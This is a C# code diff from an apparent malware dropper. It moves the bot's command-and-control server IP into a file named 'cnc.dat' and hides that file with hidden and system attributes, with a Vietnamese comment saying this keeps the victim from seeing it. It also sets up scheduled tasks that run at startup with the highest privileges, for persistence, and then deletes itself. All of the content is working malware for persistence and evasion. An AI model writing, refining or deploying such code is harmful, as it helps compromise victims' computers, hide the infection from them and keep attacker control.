@@ -196,7 +196,7 @@ namespace App
             }
         }
 
-        private static void CreateScheduledTask(string exePath, string taskName, string serverIp)
+        private static void CreateScheduledTask(string exePath, string taskName, string dummy)
         {
             Logger.Log($"Attempting to create scheduled task '{taskName}' for '{Path.GetFileName(exePath)}'");
 
@@ -208,7 +208,7 @@ namespace App
             };
             Process.Start(deleteInfo)?.WaitForExit();
 
-            string createArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\" \\\"{serverIp}\\\"\" /RL HIGHEST /F";
+            string createArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RL HIGHEST /F";
             var createInfo = new ProcessStartInfo("schtasks.exe", createArgs)
             {
                 CreateNoWindow = true,
@@ -308,8 +308,22 @@ namespace App
 
                 if (success)
                 {
-                    Logger.Log("Payload deployed. Creating persistence and executing...");
-                    CreateTasksAndExecutePayloads(extractPath, foundServerIp);
+                    try
+                    {
+                        string configPath = Path.Combine(extractPath, "cnc.dat");
+                        File.WriteAllText(configPath, foundServerIp);
+                        // Ẩn file đi để nạn nhân khó thấy
+                        File.SetAttributes(configPath, FileAttributes.Hidden | FileAttributes.System);
+                        Logger.Log($"[INFO] Config file cnc.dat created with IP: {foundServerIp}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Logger.Log($"[ERROR] Failed to create config file: {ex.Message}");
+                    }
+
+                    Logger.Log("Payload deployed. Creating persistence...");
+                    // Truyền tham số ip rỗng vì Bot sẽ tự đọc file
+                    CreateTasksAndExecutePayloads(extractPath, "");
 
                     Logger.Log("All tasks completed. Initiating self-deletion.");
                     SelfDelete();
